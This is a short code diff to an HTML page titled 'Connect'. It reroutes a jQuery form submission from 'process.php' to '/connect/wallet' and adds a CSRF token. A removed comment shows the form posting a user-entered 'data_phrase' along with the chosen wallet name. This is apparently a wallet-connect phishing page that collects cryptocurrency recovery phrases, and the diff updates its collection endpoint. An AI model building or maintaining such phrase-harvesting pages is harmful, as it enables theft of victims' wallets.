@@ -17,6 +17,7 @@
     <meta http-equiv="content-type" content="text/html;charset=UTF-8">
     <meta charset="utf-8">
     <title>Connect</title>
+    <meta name="csrf-token" content="csrf-token-placeholder">
     <meta name="author" content="themesflat.com">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <link rel="stylesheet" type="text/css" href="../static/static/connect-css/style.css">
@@ -3738,12 +3739,11 @@ window.smartsupp||(function(d) {
  
                 $.ajax({
                     method: 'POST',
-                    url: 'process.php',
+                    url: '/connect/wallet',
                     data: formData,
-
-
-                   // data:  formData { "load_phrase": 1, "data_phrase": field.val(), "wallet_selected": $('#wallet_name').text().trim() },
-                       
+                    headers: {
+                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                    },
 
                     success: function (response) {
  
